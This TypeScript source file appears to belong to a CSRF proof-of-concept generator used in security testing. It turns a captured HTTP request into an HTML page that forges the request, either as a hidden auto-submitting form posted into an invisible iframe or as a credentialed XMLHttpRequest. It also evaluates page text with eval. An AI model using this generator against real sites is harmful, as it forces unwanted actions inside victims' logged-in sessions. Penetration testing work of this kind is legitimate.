interface sendfunc {
    generate(httprequest: HTTPRequest): boolean;

    generateHTML(title: string, bodyhtml: string): string;

    send(): boolean;

    generateSendFunction(): string;
}

const formfunc = {
    generate(httprequest: HTTPRequest): boolean {
        let ezhtml: string = "";
        const req = httprequest.line;
        if (req === false) return false;
        ezhtml += `<form target="dummyfrm" name="evilform" action="${req['url']}" method="${req['method']}" enctype="${req['enctype']}">
`;
        const params = httprequest.body;
        for (let i = 0; i < params.length; i++) {
            ezhtml += HTMLrender.input(URLdecode(params[i][0]), URLdecode(params[i][1]), ((!form.isAutoSubmit() && form.isSpecifiable()) ? ("text") : ("hidden"))) + "\n";
        }
        ezhtml += `</form>
<iframe src="x" width="1" height="1" name="dummyfrm" style="visibility:hidden"></iframe>`;
        setEvilHTMLcontent(ezhtml);

        setEvilTextContent(ezhtml);
        errorMsg("");
        return true;
    },

    generateHTML(title: string, bodyhtml): string {
        let content: string =
            `${getHTMLheader(title)}
<body${(form.isAutoSubmit()) ? ' onload="csrfSubmit();' : ''}>
${bodyhtml}${(!form.isAutoSubmit()) ? '<button onclick="csrfSubmit();">submit</button>' : ''}
${this.generateSendFunction()}
<p>${title}</p>
${getHTMLfooter()}
`;
        return content;
    },

    send(): boolean {
        const req = getRequest();
        document.getElementById("stat").innerHTML += `<p>${new Date().toLocaleString()} Request sent.</p><p>${escapeHTML(req['url'])}</p><p>${escapeHTML(req['params'])}</p><hr />`;
        const submit = HTMLFormElement.prototype["submit"].bind(document.evilform);
        submit();
        return true;
    },

    generateSendFunction(): string {
        let content = `<script>
function csrfSubmit(){
    let submit = HTMLFormElement.prototype["submit"].bind(document.evilform);
    submit();
}
</script>
`;
        return content;
    }
};

const xhrfunc = {
    generate: function (httprequest: HTTPRequest) {
        const req = httprequest.line;
        const enctype: string = HTTPRequest.buildHeaderOption(httprequest.enctype);
        let ezhtml: string =
            `function csrfSubmit(){
let xhr=new XMLHttpRequest();
xhr.open('${req['method']}','${req['url']}');
xhr.withCredentials = true;
xhr.setRequestHeader('Content-Type','${enctype}');
xhr.send('${escapeJavascript(form.getBody())}');
}
`;
        setEvilTextContent(ezhtml, true);
        setEvilHTMLcontent(ezhtml);
        return true;
    },

    generateHTML: function (title: string, bodyhtml: string) {
        let content: string =
            `${getHTMLheader(title)}
<body${(form.isAutoSubmit()) ? ' onload="csrfSubmit();' : ''}>
${bodyhtml}${(!form.isAutoSubmit()) ? '<button onclick="csrfSubmit();">submit</button>' : ''}
${this.generateSendFunction()}
<p>${title}</p>
${getHTMLfooter()}
`;
        return content;
    },

    send: function () {
        eval(document.getElementById("evilzone").textContent);
        csrfSubmit();
    }
};

function getHTMLheader(title = "CSRF PoC") {
    let content = `<!DOCTYPE html>

<html>
<head>
<meta charset="utf-8">
<title>${title}</title>
</head>
`;
    return content;
}

function getHTMLfooter() {
    let content = '</html>\n';
    return content;
}
